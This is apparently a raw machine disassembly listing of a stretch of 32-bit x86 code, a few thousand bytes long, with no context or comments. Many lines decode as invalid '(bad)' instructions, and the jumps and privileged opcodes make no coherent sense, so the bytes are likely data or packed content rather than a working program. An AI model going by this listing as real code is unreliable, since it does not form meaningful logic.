  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
